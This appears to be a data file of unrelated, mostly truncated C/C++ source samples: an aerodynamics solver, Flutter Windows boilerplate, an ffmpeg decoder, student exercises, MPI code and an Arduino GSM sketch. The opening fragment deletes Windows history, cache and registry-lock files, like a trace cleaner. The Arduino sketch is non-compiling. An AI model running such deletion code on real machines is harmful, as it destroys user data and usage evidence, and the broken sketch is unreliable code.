nul\");\t\r\n\r\n\r\n\t\r\n\tsystem(\"cls\");\r\n\t\r\n\r\n\tSleep(2000);\r\n\r\n\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\History\\desktop.ini)\").c_str());\r\n\r\n\tif (DeleteFileW((LR\"(C:\\Users\\AppData\\Local\\Microsoft\\Windows\\History\\)\" + GetCurrentUserName() + LR\"(\\desktop.ini)\").c_str()) != 0)\r\n\t\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\desktop.ini\");\r\n\r\n\t\t//cout << \"Deleted C:\\\\Users\\\\Gaypple\\\\ntuser.ini:NTV\" << endl;\r\n\tprintf(\"\\nDeleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\container.dat\");\r\n\t\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOCK)\").c_str());\r\n\t\tSleep(2000);\r\n\tDeleteFileW((LR\"(D:\\Users\\)\" + GetCurrentUserName() + LR\"(\\App",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <stdlib.h>\n#include <valarray>\n#include <cstdlib>\n#include<fstream>\n\nusing namespace std;\n\nvoid UELEF0 (double EPSF,double gamma,vector<double> &XA,vector<double> &XB,vector<double> &XO,vector<double> &U ) {\n    const double PI4 = 4 * 3.14159365;\n    vector<double> RA(3),RB(3),AB(3), AL(3);\n    double TEST, HE, FUN, AR, DAL, DRA, DRB, DAB, H, C;;\n    for (int K = 0; K < 3; K++) {\n        RA[K] = XO[K] - XA[K];\n        RB[K] = XO[K] - XB[K];\n        AB[K] = XB[K] - XA[K];\n    }\n    AL[0] = RA[1] * RB[2] - RA[2] * RB[1]; // \u03c0\u03c1\u03c9\u03c4\u03b7 \u03c3\u03c5\u03bd\u03b9\u03c3\u03c4\u03c9\u03c3\u03c4\u03b1 \u03b5\u03be \u03b3\u03b9\u03bd\u03bf\u03bc\u03b5\u03bd\u03bf\u03c5\n    AL[1] = RA[2] * RB[0] - RA[0] * RB[2]; /// \u03b4\u03b5\u03c5\u03c4\u03b5\u03c1\u03b7 \u03c3\u03c5\u03bd\u03b9\u03c3\u03c4\u03c9\u03c3\u03b1\n    AL[2] = RA[0] * RB[1] - RA[1] * RB[0]; /// \u03c4\u03c1\u03b9\u03c4\u03b7 \u03c3\u03c5\u03bd\u03b9\u03c3\u03c4\u03c9\u03c3\u03b1\n    DRA = sqrt(RA[0] * RA[0] + RA[1] * RA[1] + RA[2] * RA[2]); /// \u03bc\u03b5\u03c4\u03c1\u03bf r1\n    DRB = sqrt(RB[0] * RB[0] + RB[1] * RB[1] + RB[2] * RB[2]); /// \u03bc\u03b5\u03c4\u03c1\u03bf r2\n    DAB = sqrt(AB[0] * AB[0] + AB[1] * AB[1] + AB[2] * AB[2]); /// \u03bc\u03b5\u03c4\u03c1\u03bf r0\n    DAL = AL[0] * AL[0] + AL[1] * AL[1] + AL[2] * AL[2];\n    TEST = DAL * DRA * DRB;\n    AR = sqrt(DAL); /// \u03bc\u03b5\u03c4\u03c1\u03bf \u03b5\u03be\u03c9\u03c4\u03b5\u03c1\u03b9\u03ba\u03bf\u03c5 \u03b3\u03b9\u03bd\u03bf\u03bc\u03b5\u03bd\u03bf\u03c5 |r1xr2|\n\n   C = ((RA[0] * AB[0] + RA[1] * AB[1] + RA[2] * AB[2]) / DRA -\n         (RB[0] * AB[0] + RB[1] * AB[1] + RB[2] * AB[2]) / DRB) / (PI4 * AR * DAB);\n    H = AR / DAB; /// |r1xr2|/|r0|\n        if (H < 3 * EPSF) {\n        U[0] = 0.0;\n        U[1] = 0.0;\n        U[2] = 0.0;\n    } else {\n        C = C / H;\n        U[0] = AL[0] * C * gamma + U[0];\n        U[1] = AL[1] * C * gamma + U[1];\n        U[2] = AL[2] * C * gamma + U[2];\n    }\n}\n\nint main() {\n    ofstream outdata;\n    int n=100; // \u03b1\u03c1\u03b9\u03b8\u03bc\u03cc\u03c2 \u03b4\u03b9\u03bd\u03bf\u03c0\u03b5\u03c4\u03ac\u03bb\u03c9\u03bd \u03ba\u03b1\u03b9 \u03ba\u03ad\u03bd\u03c4\u03c1\u03c9\u03bd\n    int m=3*n; // \u03b1\u03c1\u03b9\u03b8\u03bc\u03cc\u03c2 \u03b4\u03b9\u03bd\u03bf\u03c3\u03c9\u03bb\u03ae\u03bd\u03c9\u03bd\n    double b=10; // \u03b5\u03ba\u03c0\u03ad\u03c4\u03b1\u03c3\u03bc\u03b1\n    double ang=0.0873; // \u03b3\u03c9\u03bd\u03af\u03b1 5 \u03bc\u03bf\u03b9\u03c1\u03ce\u03bd \u03c3\u03b5 rad\n    double c=2.0; // \u03c7\u03bf\u03c1\u03b4\u03ae \u03c0\u03c4\u03ad\u03c1\u03c5\u03b3\u03b1\u03c2\n    double h=20.0; // \u03c4\u03bf \u03b4\u03b9\u03c0\u03bb\u03ac\u03c3\u03b9\u03bf \u03cd\u03c8\u03bf\u03c2 \u03c0\u03bf\u03c5 \u03b1\u03c0\u03ad\u03c7\u03b5\u03b9 \u03b1\u03c0\u03bf \u03c4\u03bf \u03ad\u03c6\u03b1\u03b4\u03bf\u03c2\n    double dx=b/n;\n    double Uinf=10.0; //m/s\n    double Uind=0.0;\n    int l=0;\n    double EPSF =0.01;\n    double a0=-0.0873;\n    double a=0.0 ; // \u03c3\u03b5 \u03b3\u03c9\u03bd\u03af\u03b1 \u03c0\u03c4\u03ae\u03c3\u03b7\u03c2 5 \u03bc\u03bf\u03b9\u03c1\u03ce\u03bd\n    double temp;\n    double rho=1.2;\n    vector <double> XA(3,0), XB(3,0),XO(3,0),U(3),B(n),GAMMA(n), RA(3,0),RB(3,0),AB(3,0),AL(3,0),W(n),L(n),D(n), y(n) ;\n    double A1[n][n], A2[n][n], A[n][n], Aug[n][n+1], Aw1[n][n], Aw2[n][n], Aw[n][n];\n\n    for(int i=0;i<n;i++){\n        for(int j=0;j<n;j++){\n            A[i][j]=0.0;\n        }\n    }\n    for(int i=0;i<n;i++) {\n        for (int j = 0; j < n; j++) {\n            A1[i][j] = 0.0;\n            A2[i][j] = 0.0;\n        }\n    }\n          for( int i=0;i<n;i++){\n        for(int j=0;j<=n;j++){\n            Aug[i][j]=0.0;\n        }\n    }\n          for (int i=0;i<3;i++){\n              U[i]=0.0;\n          }\n\n    outdata.open(\"Y.txt\");\n\n    for (int i=0;i<n;i++) {\n        if (i < n / 2) {\n            XO[1] = dx * (i + 0.5);\n            XO[0] = -tan(ang) * (b / 2 - dx * (i + 0.5));\n            XO[2] = 0;\n        }if (i >= n / 2){\n            XO[1] = -dx * (i-n/2 + 0.5);\n        XO[0] = -tan(ang) * (b/2 - dx * (i -n/2 +0.5));\n        XO[2] = 0;\n        }\n        double g=1.0;\n        for (int k=1;k<=m;k++) {\n            if (k <= m / 2) {\n                if (k % 3 == 1) {\n                    XA[1] = dx * (g - 1);\n                    XA[0] = 10 * c;\n                    XA[2] = 0;\n                    XB[1] = dx * (g - 1);\n                    XB[0] = -tan(ang) * (b / 2 - dx * (g - 1));\n                    XB[2] = 0;\n                }\n\n\n               \n                 if (k % 3 == 2) {\n                    XA[1] = dx * (g - 1);\n                    XA[0] = -tan(ang) * (b / 2 - dx * (g - 1));\n                    XA[2] = 0;\n                    XB[1] = dx * g;\n                    XB[0] = -tan(ang) * (b / 2 - dx * g);\n                    XB[2] = 0;\n                }\n                if (k % 3 == 0) {\n                    XA[1] = dx * g;\n                    XA[0] = -tan(ang) * (b / 2 - dx * g);\n                    XA[2] = 0;\n                    XB[1] = dx * g;\n                    XB[0] = 10 * c;\n                    XB[2] = 0;\n                    g++;\n                }\n            }\n\n            if (k > m / 2) {\n                if (k % 3 == 1) {\n                    XB[1] = -dx * (g - n / 2 - 1);\n                    XB[0] = 10 * c;\n                    XB[2] = 0;\n                    XA[1] = -dx * (g - n / 2 - 1);\n                    XA[0] = -tan(ang) * (b / 2 - dx * (g - n / 2 - 1));\n                    XA[2] = 0;\n                }\n                if (k % 3 == 2) {\n                    XB[1] = -dx * (g - n / 2 - 1);\n                    XB[0] =- tan(ang) * (b / 2 - dx * (g - n / 2 - 1));\n                    XB[2] = 0;\n                    XA[1] = -dx * (g - n / 2);\n                    XA[0] = -tan(ang) * (b / 2 - dx * (g - n / 2));\n                    XA[2] = 0;\n                }\n                if (k % 3 == 0) {\n                    XB[1] = -dx * (g - n / 2);\n                    XB[0] = -tan(ang) * (b / 2 - dx * (g - n / 2));\n                    XB[2] = 0;\n                    XA[1] = -dx * (g - n /",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"avcodec.hpp\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include <libavcodec/avcodec.h>\n#include <libavformat/avformat.h>\n#include <libswscale/swscale.h>\n#include <libavutil/display.h>\n#include <libavutil/imgutils.h>\n\n#ifdef __cplusplus\n}\n#endif\n\nextern AVInputFormat ff_mov_demuxer;\nextern AVInputFormat ff_matroska_demuxer;\nextern AVInputFormat ff_mp3_demuxer;\nextern AVInputFormat ff_flac_demuxer;\nextern AVInputFormat ff_wav_demuxer;\nextern AVInputFormat ff_aac_demuxer;\nextern AVInputFormat ff_ogg_demuxer;\nextern AVCodec ff_h264_decoder;\nextern AVCodec ff_mpeg4_decoder;\nextern AVCodec ff_vp9_decoder;\nextern AVCodec ff_vp8_decoder;\nextern AVCodec ff_mp3_decoder;\nextern AVCodec ff_flac_decoder;\nextern AVCodec ff_aac_decoder;\nextern AVCodec ff_vorbis_decoder;\n\nvoid avcodec_init()\n{\n    av_log_set_level(AV_LOG_ERROR);\n}\n\nstruct avcodec_decoder_struct {\n    const cv::Mat* mat;\n    ptrdiff_t read_index;\n    AVFormatContext* container;\n    AVCodecContext* codec;\n    AVIOContext* avio;\n    int video_stream_index;\n};\n\nstatic int avcodec_decoder_read_callback(void* d_void, uint8_t* buf, int buf_size)\n{\n    avcodec_decoder d = static_cast<avcodec_decoder>(d_void);\n    size_t buf_len = d->mat->total() - d->read_index;\n    size_t read_len = (buf_len > buf_size) ? buf_size : buf_len;\n    if (read_len == 0) {\n        return AVERROR_EOF;\n    }\n    memmove(buf, d->mat->data + d->read_index, read_len);\n    d->read_index += read_len;\n    return read_len;\n}\n\nstatic int64_t avcodec_decoder_seek_callback(void* d_void, int64_t offset, int whence)\n{\n    avcodec_decoder d = static_cast<avcodec_decoder>(d_void);\n    uint8_t* to;\n    switch (whence) {\n    case SEEK_SET:\n        to = d->mat->data + offset;\n        break;\n    case SEEK_CUR:\n        to = d->mat->data + d->read_index + offset;\n        break;\n    case SEEK_END:\n        to = d->mat->data + d->mat->total() + offset;\n        break;\n    case AVSEEK_SIZE:\n        return d->mat->total();\n    default:\n        return -1;\n    }\n    if (to < d->mat->data) {\n        return -1;\n    }\n    if (to >= (d->mat->data + d->mat->total())) {\n        return -1;\n    }\n    d->read_index = (to - d->mat->data);\n    return 0;\n}\n\nstatic bool avcodec_decoder_is_audio(const avcodec_decoder d)\n{\n    if (!d->container) {\n        return false;\n    }\n    if (d->container->iformat == &ff_mp3_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_flac_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_wav_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_aac_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_ogg_demuxer) {\n        return true;\n    }\n    return false;\n}\n\nbool avcodec_decoder_is_streamable(const opencv_mat mat) {\n    const int64_t probeBytesLimit = 32 * 1024; // Define the probe limit\n    const size_t atomHeaderSize = 8;\n    int64_t bytesRead = 0;\n    const cv::Mat* buf = static_cast<const cv::Mat*>(mat);\n    size_t bufSize = buf->total();\n    size_t peekSize = MIN(bufSize, probeBytesLimit);\n\n    while(bytesRead + atomHeaderSize <= peekSize) {\n        // Read atom size and type\n        uint32_t atomSize = (buf->data[bytesRead] << 24) | (buf->data[bytesRead + 1] << 16) |\n                            (buf->data[bytesRead + 2] << 8) | buf->data[bytesRead + 3];\n\n        // Validate atom size\n        if (atomSize < atomHeaderSize || atomSize + bytesRead > bufSize) {\n            break;\n        }\n\n        // Read atom type\n        char atomType[4];\n        memcpy(atomType, &buf->data[bytesRead + 4], 4);\n\n        // Check for 'moov' and 'mdat' atoms using byte comparison\n        if (memcmp(atomType, \"moov\", 4) == 0) {\n            return true;\n        }\n        if (memcmp(atomType, \"mdat\", 4) == 0) {\n            return false;\n        }\n\n        // Move to the next atom position\n        bytesRead += atomSize; // Atom size includes the header size\n    }\n\n    return false;\n}\n\navcodec_decoder avcodec_decoder_create(const opencv_mat buf)\n{\n    avcodec_decoder d = new struct avcodec_decoder_struct();\n    memset(d, 0, sizeof(struct avcodec_decoder_struct));\n    d->mat = static_cast<const cv::Mat*>(buf);\n\n    d->container = avformat_alloc_context();\n    if (!d->container) {\n        avcodec_decoder_release(d);\n        return NULL;\n    }\n\n    d->avio = avio_alloc_context(\n      NULL, 0, 0, d, avcodec_decoder_read_callback, NULL, avcodec_decoder_seek_callback);\n    if (!d->avio) {\n        avcodec_decoder_release(d);\n        return NULL;\n    }\n    d->container->pb = d->avio;\n\n    int res = avformat_open_input(&d->container, NULL, NULL, NULL);\n    if (res < 0) {\n        avformat_free_context(d->container);\n        d->container = NULL;\n        avcodec_decoder_release(d);\n        return NULL;\n    }\n\n    // perform a quick search for the video stream index in the container\n    AVCodecParameters* codec_params = NULL;\n    for (int i = 0; i < d->container->nb_streams; i++) {\n        if (d->container->streams[i]->codecpar-",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct DetailAlamat {\n\tstring desa;\n\tstring kota;\n};\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tint umur;\n};\n\nint main()\n{\n\tMahasiswa mhs[3];\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << \"Data ke-\" << (i + 1) << endl;\n\t\tcout << \"Nomor Mahasiswa : \";\n\t\tgetline(cin, mhs[i].nim);\n\t\tcout << \"Nama Mahasiswa : \";\n\t\tgetline(cin, mhs[i].nama);\n\n\t\tcout << \"Alamat Mahasiswa : \" << endl;\n\t\tcout << \"\\t Nama Desa : \";\n\t\tcin >> mhs[i].alamat.desa;\n\t\tcout << \"\\t Nama Kota : \";\n\t\tcin >> mhs[i].alamat.kota;\n\t\tcout << \"Umur Mahasiswa : \";\n\t\tcin >> mhs[i].umur;\n\t\tcin.ignore(1, '\\n');\n\t\tcout << endl;\n\t}\n\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << endl;\n\t\tcout << \"data Mahasiswa ke-\" << (i + 1) << endl;\n\t\tcout << \"\\n NIM : \" << mhs[i].nim;\n\t\tcout << \"\\n Nama : \" << mhs[i].nama;\n\t\tcout << \"\\n Alamat : \";\n\t\tcout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n\t\tcout << \"\\n \\t Kota: \" << mhs[i].alamat.kota;\n\t\tcout << \"\\n Umur : \" << mhs[i].umur;\n\t\tcout << endl;\n\t}\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include <iostream>\r\n#include <random>\r\n#include \"mpi.h\"\r\n#include <chrono>\r\n\r\n#define N 4 // \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u0430 N \u0434\u043b\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u043d\u043e\u0441\u0442\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0445 \u043c\u0430\u0442\u0440\u0438\u0446\r\n\r\nusing namespace std;\r\n\r\nvoid print_matrix(int m[N][N], string name) {\r\n    cout << name << \" = \" << endl;\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            cout << \" \" << m[i][j] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n    int rank, numtasks;\r\n    MPI_Init(&argc, &argv);\r\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\r\n    MPI_Comm_size(MPI_COMM_WORLD, &numtasks);\r\n\r\n    // \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447 \u0447\u0438\u0441\u0435\u043b\r\n    random_device rd;\r\n    mt19937 gen(rd() + rank);\r\n    uniform_int_distribution<int> dis(1, 1000);\r\n\r\n    int a[N][N];\r\n    int b[N][N];\r\n    int c[N][N];\r\n    int aa[N], cc[N];\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    // \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u0441\u043b\u0443\u0447 \u0447\u0438\u0441\u043b\u0430\u043c\u0438\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            a[i][j] = dis(gen);\r\n            b[i][j] = dis(gen);\r\n        }\r\n    }\r\n\r\n    MPI_Scatter(a, N * N / numtasks, MPI_INT, aa, N * N / numtasks, MPI_INT, 0, MPI_COMM_WORLD);\r\n    MPI_Bcast(b, N * N, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    auto start = chrono::steady_clock::now();\r\n\r\n    //\u043f\u0435\u0440\u0435\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u043c\u0430\u0442\u0440\u0438\u0446\r\n    int sum = 0;\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            sum += aa[j] * b[j][i];\r\n        }\r\n        cc[i] = sum;\r\n        sum = 0;\r\n    }\r\n\r\n    MPI_Gather(cc, N * N / numtasks, MPI_INT, c, N * N / numtasks, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    auto end = chrono::steady_clock::now();\r\n    if (rank == 0) {\r\n        auto duration = chrono::duration_cast<chrono::duration<double>>(end - start);\r\n        cout << \"time:  \" << duration.count() << \" seconds\" << endl;\r\n        print_matrix(a, \"A\");\r\n        print_matrix(b, \"B\");\r\n        print_matrix(c, \"C\");\r\n    }\r\n\r\n    MPI_Finalize();\r\n}\r\n",
    "#include <Arduino.h>\n#include <ArduinoJson.h>\n\n\n// COMMANDS\n// AT\n// OK\n// AT + CSQ\n// + CSQ: 7, 0\n// OK\n// AT + COPS ?\n// +COPS : 0, 0, \"TCI\"\n// OK\n// AT + CCID\n// 89981111000059380700\n// OK\n// AT + CMGF = 1\n// OK\n// ATD + +982122202059;\n// OK\n// ATH\n// OK\n// ATD + +989121220205;\n// AT+DDET=1,100,0,0\n// OK\n// String\n\nString configure();\nString profileController(String option);\nString getData();\nString setData();\nString makeCall(int number);\nString sendSMS(int number, String message);\nString DTMF();\nString readSMS();\n\nString getDataSIMCARDMODULE() {\n    AT+GMI\n    AT+GMM\n    AT+GMR\n    AT+CGMI\n    AT+CGMM\n        AT+CGMR\n    AT+CIMI\n    AT+CPAS\n\n}\n\nString BaudRate() {\n    AT+IPR?\n}\n\nString contacts() {\n    AT+CPBF\nAT+CPBR=2\nAT+CPBS=?\n    AT+CPBW\n\n}\n\nString status(){\n    AT+CREG?\n    AT+CSQ\n    AT+CFUN?\n    AT+CALM?\n    AT+CSCA?\n\n    AT+CCLK?\n\n}\n\nString getData() {\n    AT+CNUM\n}\n\nString setupSMS() {\n    AT+CMGF=1\n}\n\nString SMSRead() {\n    AT+CMGL=5\n    AT+CMGR=?\n}\n\nString SMSSend() {\n    AT+CMGS\n}\n\nString SMSsave() {\n        AT+CMGW\n}\n\nString SMSSendFromStorage() {\n        AT+CMSS\n\n}\n\nString SMSMode() {\n        AT+CNMI\n\n}\n\nString SMSRestore() {\n    AT+CRES\n\n}\n\nString SMSSaveSettings() {\n    AT+CSAS\n}\n\nString SMSModem() {\n    AT+CSCB\n}\n\nString SMSSetMOde() {\n    AT+CSMP\n    AT+CADC?\n\n}\n\nString getLocalTimeStamp() {\nAT+CLTS // CHECK\n}\n\nString getProviderName() {\n    AT+CSPN?\n    AT+CCID\n    AT+GSV\nAT+CROAMING\n\n}\n\nString moduleBehaviour() {\n    AT+CCALR\nAT+CSMINS?\nAT+CMNRP\n}\n\nvoid DTMF() {\n    AT+DDET=1,0,0\n}\n\nvoid detectAntenna() {\nAT+CANT?\n\n}\n\nString setData() {\n    //AT+CTTRING\n    // AT+SJDR\n    // AT+CMEDPLAY\n// AT+CCODE\n    // AT+CHF\n    // AT+CSCLK\n}\n\nString restart() {\nCDSCB\n}\n\nString timer() {\n    AT+CALA\n    AT+CALD\n}\n\nString powerOff() {\n    AT+CPOWD\n}\n\nString deleteAllSMS() {\nAT+CMGDA\n}\n\nString sendToolKitTones() {\n    AT+STTONE=?\n}\n\nString readEmergencyCommands(){\n    Serial.println(\"AT+CEMNL?\");\nAT+CEMNL=<\nmode>[,<amount\n>,<emergency\nnumbers>\n}\n\nString setGSMStatus(int type) {\n    Serial.println(\"AT+GSMBUSY=%d\", type); // 1 => enable / 2 